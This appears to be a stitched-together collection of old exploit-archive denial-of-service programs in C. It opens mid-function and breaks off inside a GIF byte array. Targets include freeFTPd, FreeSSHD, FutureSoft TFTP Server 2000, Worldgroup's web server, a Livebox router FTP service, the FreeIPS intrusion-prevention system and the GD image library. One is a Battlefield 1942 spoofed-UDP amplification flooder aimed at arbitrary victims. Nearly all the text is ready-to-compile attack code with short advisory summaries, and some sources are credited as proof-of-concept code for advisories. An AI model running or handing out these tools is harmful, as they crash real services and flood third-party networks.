    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();

    p = buff;
    if(bug == 1) {
        p += putxx(buff, JUMBO_SIZE, 16);
        p += putxx(p, 0, 32);   // whole_packet_len, must be < 6
    } else if(bug == 2) {
        p += 2;
        *p++ = PACKET_PLAYER_INFO;  // PACKET_PLAYER_INFO, PACKET_GAME_INFO, PACKET_EDIT_PLAYER_CREATE, PACKET_EDIT_PLAYER_REMOVE. PACKET_EDIT_CITY, PACKET_EDIT_PLAYER
        p += putcc(p, 0xff, 100);
        putxx(buff, p - buff, 16);
    } else {
        printf("\nError: invalid bug number (%d)\n", bug);
        exit(1);
    }

    printf("- send malformed packet\n");
    send(sd, buff, p - buff, 0);

    if(!timeout(sd, 3)) recv(sd, buff, BUFFSZ, 0);
    close(sd);

    printf("\n- done, check the server manually\n");
    return(0);
}



int putcc(u8 *data, int chr, int size) {
    memset(data, chr, size);
    return(size);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int putss(u8 *data, u8 *str) {
    int     len;

    len = strlen(str) + 1;
    memcpy(data, str, len);
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            fprintf(stderr, "\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


// freeFTPd Denial of Service Attack
// Tested on a Win XP Sp1 Box


#include "stdio.h"
#include "winsock2.h"
#pragma comment (lib,"ws2_32")


#define PORT 21
#define USER "root"
#define PASS "root"
#define L    "--------------------------------------------------"
#define HL   "freeFTPd (1.0.10) DoS Exploit by steve01@chello.at"
#define BOOM "23"

typedef unsigned long ulong;
ulong resolv_host(char *);

int main(int argc, char* argv[])
{

   WSADATA wsa;
   SOCKET s_target;
   struct sockaddr_in addr;
   WORD wsVersion;
   int err=0;

   if(argc<2)
   {
       printf("%s\n",L);
       printf("%s\n",HL);
       printf("%s\n",L);
       printf("Usage: %s <www.target.com>\n",argv[0]);
       exit(0);
   }

   printf("%s\n",L);
   printf("%s\n",HL);
   printf("%s\n",L);


   if(WSAStartup(wsVersion=MAKEWORD(2,2),&wsa))
   {
       printf("Error WSAStartup() Error Code: %d\n",WSAGetLastError());
       exit(1);
   }



   s_target=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if(s_target==INVALID_SOCKET)
   {
       printf("Error socket() Error Code: %d\n",WSAGetLastError());
       exit(2);
   }


   addr.sin_family = AF_INET;
   addr.sin_port = htons(PORT);
   addr.sin_addr.s_addr= resolv_host(argv[1]);

   if(connect(s_target,(SOCKADDR *)&addr,sizeof(addr)))
   {
       printf("Error connect() Error Code: %d\n",WSAGetLastError());
       exit(3);
   }

   int recvsize=0;
   char recvbuffer[400];
   char sendbuffer[400];

   //recv banner
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';
   //send user
   strncpy(sendbuffer,"USER ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,USER,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);

   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv user stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,"PASS ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,PASS,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);

   //send pass
   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv pass stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,"PORT ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,BOOM,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);
   send(s_target,sendbuffer,strlen(sendbuffer),0);


   closesocket(s_target);
   WSACleanup();



   return 0;
}


ulong resolv_host(char *host)
{

ulong uhost=0;
struct hostent *th;

uhost=inet_addr(host);
if(uhost==INADDR_NONE)
{
 th=gethostbyname(host);
 if(!th)
 {
   printf("Check if %s is up \n",host);
   exit(0);
 }

 uhost=*(unsigned long*)th->h_addr;

}



return uhost;


}

// milw0rm.com [2005-11-24]
source: http://www.securityfocus.com/bid/10541/info

It is reported that FreeIPS is susceptible to a denial of service vulnerability.

FreeIPS scans TCP connections for particular strings, defined by regular expressions. If a packet matches the regular expression, FreeIPS assumes malicious intent and attempts to close the TCP connection. It accomplishes this by sending TCP RST packets to both the client (attacker) and the server (victim TCP server).

The software correctly generates a TCP RST+ACK packet to the originating client, but the packet sent to the server is incorrectly generated. The packet sent to the server contains invalid sequence and acknowledgment numbers and is ignored.

An attacker can deny service to any TCP application protected by FreeIPS, denying network service to legitimate users.

The attacker would have to know or guess a string pattern that matches a regular expression in FreeIPS to successfully exploit this vulnerability.

int main(int argc, char *argv[])
{
        int sockfd, pass=0, len;
        struct sockaddr_in server;

        if (argc < 4)
        {
                printf ("USAGE: %s IP port payload [paylen]\n", argv[0]);
                exit(1);
        }
        if (argc > 4)
                len = atoi(argv[4]);
        else
                len = strlen(argv[3]);

        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_port = htons(atoi(argv[2]));
        server.sin_family = AF_INET;

        while (1)
        {
                printf("pass: %d\n", ++pass);
                if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
                {
                        perror("socket");
                        exit(1);
                }

                if (connect(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr_in)) < 0)
                {
                        perror("connect");
                        continue;
                }

                if (send(sockfd, argv[3], len, 0) != len)
                {
                        perror("send");
                        exit(1);
                }

                close(sockfd);
        }
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        22
#define BUFFSZ      8192
#define SSH2_MSG_NEWKEYS    21



int ssh_send(int sd, int type, u8 *buff, int len);
int str_recv(int sd, u8 *buff, int len);
int tcp_recv(int sd, u8 *buff, int len);
int ssh_recv(int sd, u8 *buff);
int putsh(u8 *dst, u8 *str);
int putcc(u8 *data, int chr, int len);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u16     port    = PORT;
    u8      buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "FreeSSHD <= 1.20 NULL pointer crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(str_recv(sd, buff, BUFFSZ) < 0) goto quit;
    printf("- received banner: %s\n", buff);

    #define SSHBANNER   "SSH-2.0-OpenSSH\r\n"
    if(send(sd, SSHBANNER, sizeof(SSHBANNER) - 1, 0) < 0) goto quit;

    printf("- send SSH2_MSG_NEWKEYS packet\n");
    if(ssh_send(sd, SSH2_MSG_NEWKEYS, NULL, 0) < 0) goto quit;
    while(!ssh_recv(sd, buff));

quit:
    close(sd);
    return(0);
}



int ssh_send(int sd, int type, u8 *buff, int len) {
    int     rem;
    u8      tmp[16];

    rem = (((len + 6) + 15) & (~15)) - (len + 6);
    printf("- %d bytes sent (%d + %d)\n", 6 + len + rem, len, rem);

    putxx(tmp, 1 + 1 + len + rem, 32);
    tmp[4] = rem;
    tmp[5] = type;
    if(send(sd, tmp,  6,       0) != 6)   return(-1);

    if(len) {
        if(send(sd, buff, len, 0) != len) return(-1);
    }
    if(rem) {
        memset(tmp, 0, rem);
        if(send(sd, tmp,  rem, 0) != rem) return(-1);
    }
    return(0);
}



int str_recv(int sd, u8 *buff, int buffsz) {
    int     len,
            t;

    buffsz--;
    for(len = 0; len < buffsz; len++) {
        if(timeout(sd, 1) < 0) return(-1);
        t = recv(sd, buff + len, 1, 0);
        if(t <= 0) return(-1);
        if(buff[len] == '\n') break;
        if(buff[len] == '\r') buff[len] = 0;
    }
    buff[len] = 0;
    return(0);
}



int tcp_recv(int sd, u8 *buff, int len) {
    int     t;
    u8      *p;

    for(p = buff; len; p += t, len -= t) {
        if(timeout(sd, 1) < 0) return(-1);
        t = recv(sd, p, len, 0);
        if(t <= 0) return(-1);
    }
    return(0);
}



int ssh_recv(int sd, u8 *buff) {
    u32     len;
    u8      tmp[4];

    if(tcp_recv(sd, tmp, 4) < 0) return(-1);
    getxx(tmp, &len, 32);
    if(len > BUFFSZ) return(0);
    if(tcp_recv(sd, buff, len) < 0) return(-1);
    printf("- %d bytes received\n", len);
    return(len);
}



int putsh(u8 *dst, u8 *str) {
    int     len;

    len = strlen(str);
    putxx(dst, len, 32);
    memcpy(dst + 4, str, len);
    return(4 + len);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << ((bytes - 1 - i) << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
*
* FutureSoft TFTP Server 2000 Remote Denial of Service Exploit
* http://www.futuresoft.com/products/lit-tftp2000.htm
* Bug Discovered by SIG^2 (http://www.security.org.sg)
* Exploit coded By ATmaCA
* Web: atmacasoft.com && spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan
* Usage:tftp_exp <targetIp> [targetPort]
*
*/

/*
*
* Vulnerable Versions:
* TFTP Server 2000 Evaluation Version 1.0.0.1
*
*/

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

/* |RRQ|AAAAAAAAAAAAAAAA....|NULL|netasc|NULL| */
char expbuffer[] =
"\x00\x01"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x58\x58\x58\x58" /* EIP */
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x6E\x65\x74\x61\x73\x63\x69"
"\x69\x00";

void main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent *pTarget;
        struct sockaddr_in sock;
        SOCKET mysocket;
        int destPORT = 69;//Default to 69

        if (argc < 2){
                printf("FutureSoft TFTP Server 2000 Remote Denial of Service Exploit\n");
                printf("http://www.futuresoft.com/products/lit-tftp2000.htm\n");
                printf("Bug Discovered by SIG^2 (http://www.security.org.sg)\n");
                printf("Exploit coded By ATmaCA\n");
                printf("Web: atmacasoft.com && spyinstructors.com\n");
                printf("E-Mail: atmaca@icqmail.com\n");
                printf("Credit to kozan\n");
                printf("Usage:tftp_exp <targetIp> [targetPort]\n");
                return;
        }
        if (argc==3)
                destPORT=atoi(argv[2]);

        printf("Requesting Winsock...\n");
        wVersionRequested = MAKEWORD(1, 1);
        if (WSAStartup(wVersionRequested, &wsaData) < 0) {
                printf("No winsock suitable version found!");
                return;
        }
        mysocket = socket(AF_INET, SOCK_DGRAM	, 0);
        if(mysocket==INVALID_SOCKET){
                printf("Can't create UDP socket\n");
                exit(1);
        }
        printf("Resolving Hostnames...\n");
        if ((pTarget = gethostbyname(argv[2])) == NULL){
                printf("Resolve of %s failed\n", argv[1]);
                exit(1);
        }
        memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
        sock.sin_family = AF_INET;
        sock.sin_port = htons(destPORT);

        printf("Connecting...\n");
        if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){
                printf("Couldn't connect to host.\n");
                exit(1);
        }

        printf("Connected!...\n");
        Sleep(10);

        printf("RRQ->Sending packet. Size: %d\n",sizeof(expbuffer));
        if (send(mysocket,expbuffer, sizeof(expbuffer)+1, 0) == -1){
                printf("Error sending packet\n");
                closesocket(mysocket);
                exit(1);
        }
        printf("Packet sent........\n");
        printf("Success.\n");

        closesocket(mysocket);
        WSACleanup();
}

// milw0rm.com [2005-06-02]
source: http://www.securityfocus.com/bid/4186/info

Galacticomm Worldgroup is a community building package of both client and server software for Microsoft Windows. Worldgroup is based on BBS software, and includes web and ftp servers.

A vulnerability has been reported in the web server included with Worldgroup. If a HTTP GET request is received by the server consisting of a long string of arbitrary characters, the server will crash. A restart may be required in order to regain normal functionality.

Earlier versions of Worldgroup may share this vulnerability. 

/*
        by Limpid Byte project
        http://lbyte.void.ru
        lbyte@host.sk

Worldgroup Server Denial of Service for
Windows 9x/ME only.
Error between system fuction windows and
worldgroup from web interface.
REGUEST:
GET /signup/a.[aaaaaaaa....aaaa]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define FOUND "200"

int main(int argc, char *argv[])
{
        int sock, count;
        struct sockaddr_in blah;
        struct hostent *he;
        char cgiBuff[1024];
        WSADATA wsaData;

        if (argc < 2)
        {
                printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThis program crash Worldgroup servers 3.20 for windows 95/98/ME.\n");
                printf("Greets to [WhU]//[GiN]//[LByte]//[WGHACK] projects!\n\n");
                printf(" USAGE   : www_dos.exe [HOST] \n");
                printf(" example : www_dos.exe 127.0.0.1 \n");
                exit(1);
        }

        if(WSAStartup(0x101,&wsaData))
        {
                printf("Unable to initialize WinSock lib.\n");
                exit(1);
        }
        printf("Let's crash the World!\n");
        printf("Coded by the [eaSt]:\n");
        printf("\nScanning %s on port 80...\n\n", argv[1]);

        for (count = 0; count < 94; count++)
        {
                sock = socket(AF_INET,SOCK_STREAM,0);
                blah.sin_family=AF_INET;
                blah.sin_addr.s_addr=inet_addr(argv[1]);
                blah.sin_port=htons(80);
                if ((he = gethostbyname(argv[1])) != NULL)
                {
                        memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length);
                }
                else
                {
                        if ((blah.sin_addr.s_addr = inet_addr(argv[1]))==INADDR_NONE)
                    {
                                WSACleanup();
                                exit(1);
                        }
                }

                if (connect(sock,(struct sockaddr*)&blah,sizeof(blah))!=0)
                {
                        WSACleanup();
                        exit(1);
                }

                memset(cgiBuff, 0, sizeof(cgiBuff));
                sprintf(cgiBuff, "GET /signup/");
                memset(cgiBuff + 12, 'a', 219 + count);
                sprintf(cgiBuff + 12 + 219 + count, ".txt?=../test.txt HTTP/1.0\n\n");
                printf("Sending: %d symbols request\n", strlen(cgiBuff));

                send(sock,cgiBuff,strlen(cgiBuff),0);
                memset(cgiBuff, 0, sizeof(cgiBuff));
                if(!recv(sock,cgiBuff,sizeof(cgiBuff),0)) {
                        printf("Crashed\n");
                }
                else {
                        cgiBuff[32] = 0;
                        if (strstr(cgiBuff,FOUND))
                        {
                                printf("Send (%s)\n", cgiBuff);
                        }
                        else
                        {
                                printf("Not Found (%s)\n", cgiBuff);
                        }
                }

                closesocket(sock);
        }

        printf("Try reconnect to %s\n", argv[1]);
        WSACleanup();
        return 0;
}
/*
Discovered bY 0in From DaRk-CodeRs Programming & Security Group!
Contact: 0in(dot)email[at]gmail(dot)com
HOMEPAGE: http://dark-coders.4rh.eu

DESCRIPTION:

Livebox router is vulnerability to remote (but from local network, because firewall working..) buffer overflow DoS attack to FTP service.


POC:
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int port=21;
struct hostent *he;
struct sockaddr_in their_addr;



int konekt(char *addr)
{
int sock;

he=gethostbyname(addr);
if(he==NULL)
{
printf("Unknow host!\nexiting...");
return -1;
}
if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
{
perror("socket");
return -2;
}

their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(port);
their_addr.sin_addr = *((struct in_addr *)he->h_addr);
memset(&(their_addr.sin_zero), '\0', 8);
if (connect(sock, (struct sockaddr *)&their_addr,
sizeof(struct sockaddr)) == -1)
{
perror("connect");
return -1;
}

return sock;
}

int main(int argc,char *argv[])
{
printf("\n+===============================Yeah======================================+");
printf("\n+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada Livebox DSL Router) =+");
printf("\n+= Remote Buffer Overflow DoS Exploit =+");
printf("\n+= bY =+");
printf("\n+= Maks M. [0in] From Dark-CodeRs Security & Programming Group! =+");
printf("\n+= 0in(dot)email[at]gmail(dot)com =+");
printf("\n+= Please visit: http://dark-coders.4rh.eu =+");
printf("\n+= Greetings to: Die_Angel, Sun8hclf, M4r1usz, Aristo89, Djlinux =+");
printf("\n+= And other friends: MaLy, Slim, elwin013, Rade0n3900, Wojto111, =+");
printf("\n+= Chomzee, AfroPL, Joker186 =+");
printf("\n+===============================Yeah======================================+");

if(argc<2)
{
printf("\nUse %s [IP]!\n",argv[0]);
exit(0);
}
printf("\nConnecting to:%s...",argv[1]);
int sock=konekt(argv[1]);
if(sock<0)
{
printf("\neh...");
exit(0);
}
printf("\nConnected!!\n");
char rcv[256];
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nSending evil buffer..");
char evil[100*100]="%n\x01\x02\x03\x04";
int i;
for(i=0;i<(100*100)-100;i++)
{
strcat(evil,"A");
}

strcat(evil,"\r\n");
send(sock,evil,strlen(evil),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
char pass[100*1000]="PASS ";
strcat(pass,evil);
strcat(pass,"\n\r");
send(sock,pass,strlen(pass),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nOK!\nYou're Livebox FTP server should fucked out...");

exit(0);
}

// milw0rm.com [2008-03-01]
source: http://www.securityfocus.com/bid/6636/info

A vulnerability has been reported for several games that support the use of the GameSpy network.

A game client typically queries a game server using the UDP protocol. It has been reported that a simple query by a client may result in a game server responding with overly large responses which may result in the saturation of available network bandwidth.

Exploitation of this issue may aid in launching denial of service attacks against other hosts and networks.

/************************************************************************/
/* Battlefield 1942 - All Versions flooder (proof-of-concept)   	*/
/*         by Mike Kristovich (mkristovich@pivx.com)			*/
/* 									*/
/* Filename: bf1942dos.c						*/
/* Location: http://www.pivx.com/kristovich/poc/bf1942dos.c		*/
/*  									*/
/* Proof-of-concept code for PivX Security Advisory MK#001		*/
/*  									*/
/* Linux version (MK-POC-001/1.0)					*/
/*  									*/
/* Description of code:							*/
/*  This exploit will spoof UDP packets from a source which you 	*/
/*  specify, to a Battlefield 1942 server.  The server will send	*/
/*  packets to the victim, regardless of victim status.			*/
/*									*/
/*									*/
/* This source has been tested and compiled on Linux.  			*/
/* This source is covered by the GNU GPL.				*/
/************************************************************************/
/* Thanks to Luigi for assistance with the code!			*/
/************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <string.h>


#define IPSZ		sizeof(struct iphdr)
#define UDPSZ		sizeof(struct udphdr)
#define DATASZ		sizeof(STRING) - 1
#define PSEUDOSZ	sizeof(struct pseudohdr)
#define BUFFSZ		100
#define SIZE		(IPSZ + UDPSZ + DATASZ)
#define STRING		"\\players\\status\\packets\\rules\\"
#define SRCPORT		1204
#define DSTPORT		230

u_short in_cksum(unsigned short *addr, int len);
u_long resolv(char *host);
void std_err(void);


struct pseudohdr {
	u_int32_t	saddr;
	u_int32_t	daddr;
	u_int8_t	zero;
	u_int8_t	protocol;
	u_int16_t	length;
} *pseudohdr;


int main(int argc, char *argv[]) {
 
	u_char	buff[BUFFSZ],
		pseudobuff[BUFFSZ],
		*data;
	struct	sockaddr_in 	peer;
	struct	iphdr	*iphdr;
	struct	udphdr	*udphdr;
	int	shandle,
		err;
	u_int32_t	source,
			dest;
	u_int16_t	sport,
			dport;

	int packetsent;
	int maxpackets;
	int pktdoubler;
	int bandwidth;

	printf("\r\n---------------------------------------------------\r\n");
	printf("      Game Server DoS  -  Proof-of-Concept\r\n");
	printf("   by Mike Kristovich, PivX Security Researcher\r\n");
	printf("= http://www.PivX.com :    : mkristovich@pivx.com =\r\n");
	printf("---------------------------------------------------\r\n");
	printf("= Advisory MK#001 :        : Battlefield 1942 DoS =\r\n");
	printf("---------------------------------------------------\r\n");



	setbuf(stdout, NULL);
	
	if(argc < 4)
	{
	  fprintf(stderr,"Usage: %s <IP_to_flood> <Server_IP> <kBps_to_use> <#_packets>\r\n",*argv);
	  printf(":: Options :: <victim_port[default 53]> <server_port[default 23000]>\r\n");
	  exit(1);
        };

	source = resolv(argv[1]);
	dest   = resolv(argv[2]);

	if (!argv[6])
          dport  = DSTPORT;
	else
	  dport  = atoi(argv[6]);
     
	if (!argv[5]) 
	   sport =  SRCPORT;
	else
	   sport  = atoi(argv[5]);
	

	printf("Sending packets to server ...");
 
	
	peer.sin_addr.s_addr = dest;
	peer.sin_port        = htons(dport);
	peer.sin_family      = AF_INET;

	iphdr     = (struct iphdr *)buff;
	udphdr    = (struct udphdr *)(buff + IPSZ);
	data      = (u_char *)(buff + IPSZ + UDPSZ);
	pseudohdr = (struct pseudohdr *)pseudobuff;

	/* build data */
	memcpy(data, STRING, DATASZ);

	/* build IP header */
	iphdr->ihl      = 5;
	iphdr->version  = 4;
	iphdr->tos      = 0x8;
	iphdr->tot_len  = SIZE;
	iphdr->id       = 156;
	iphdr->frag_off = 0;
	iphdr->ttl      = 128;
	iphdr->protocol = IPPROTO_UDP;
	iphdr->check    = 0;
	iphdr->saddr    = source;
	iphdr->daddr    = dest;

	/* build UDP header */
	udphdr->source = htons(sport);
	udphdr->dest   = htons(dport);
	udphdr->check  = 0;
	udphdr->len    = htons(UDPSZ + DATASZ);

	/* build pseudo header for calculate checksum (copy UDP header and data in it) */
	memcpy(pseudobuff + PSEUDOSZ, buff + IPSZ, UDPSZ + DATASZ);

	pseudohdr->saddr    = iphdr->saddr;
	pseudohdr->daddr    = iphdr->daddr;
	pseudohdr->zero     = 0;
	pseudohdr->protocol = IPPROTO_UDP;
	pseudohdr->length   = udphdr->len;

	udphdr->check = in_cksum((u_short *)pseudobuff, PSEUDOSZ + UDPSZ + DATASZ);

	/* send all */
	shandle = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(shandle < 0) std_err();
	
	/* do kbps handling */

	/* set up max packets */
	maxpackets = atoi(argv[4]);
	/* set up packet-doubler bandwidth management */
	bandwidth = atoi(argv[3]);

	for (packetsent = 0; packetsent < maxpackets; packetsent++) {

	  for (pktdoubler = 0; pktdoubler < bandwidth; pktdoubler++) {
            err = sendto(shandle, buff, SIZE, 0, (struct sockaddr *)&peer, sizeof(peer));
     	    if(err < 0) std_err();
	    packetsent++;
	  };
	    usleep(24000);
	
	};

	printf("\r\nSpoofed packets sent to Battlefield 1942 server.\r\n");
	close(shandle);

	return(0);
}


u_short in_cksum(unsigned short *addr, int len) {
        int	sum = 0;
        u_short	answer = 0;
        register	u_short *w = addr;
        register int	nleft = len;

        while(nleft > 1)  {
                sum += *w++;
                nleft -= 2;
        }
        if(nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w ;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}


u_long resolv(char *host) {
	struct	hostent	*hp;
	u_long	host_ip;

	host_ip = inet_addr(host);
	if(host_ip == INADDR_NONE) {
		hp = gethostbyname(host);
		if(hp == 0) std_err();
		else host_ip = *(u_long *)(hp->h_addr);
	}

	return(host_ip);
}


void std_err(void) {
	perror("\nError");
	exit(1);
}source: http://www.securityfocus.com/bid/18294/info

The GD Graphics Library is prone to a denial-of-service vulnerability. Attackers can trigger an infinite-loop condition when the library tries to handle malformed image files.

This issue allows attackers to consume excessive CPU resources on computers that use the affected software. This may deny service to legitimate users.

GD version 2.0.33 is vulnerable to this issue; other versions may also be affected.

/* id: gdbad.c, Xavier Roche, May. 2006 */
/* gcc gdbad.c -o bad -lgd && ./bad */

#include <stdio.h>
#include <stdlib.h>
#include "gd.h"

static const unsigned char gifdata[8994];
int main(void) {
  gdImagePtr im;
  if ( ( im = gdImageCreateFromGifPtr(8994,
          (char*) &gifdata[0]) ) != NULL) {
    fprintf(stderr, "success!\n");
    gdImageDestroy(im);
  } else {
    fprintf(stderr, "failed!\n");
  }
  return 0;
}

/* GIF data (image taken from
<http://www.alltooflat.com/geeky/elgoog/m/imgdb/351/intl%5Een%5Eimages%5Elogo.gif>)
*/
static const unsigned char gifdata[8994] = {71,73,70,56,55,97,20,1,110,
0,247,0,0,247,247,247,255,251,255,231,231,231,214,211,214,239,235,239,
206,203,206,173,20,0,222,219,222,24,69,173,24,73,181,16,52,132,16,60,
148,198,24,0,181,178,181,247,243,247,140,16,0,198,190,189,189,186,189,
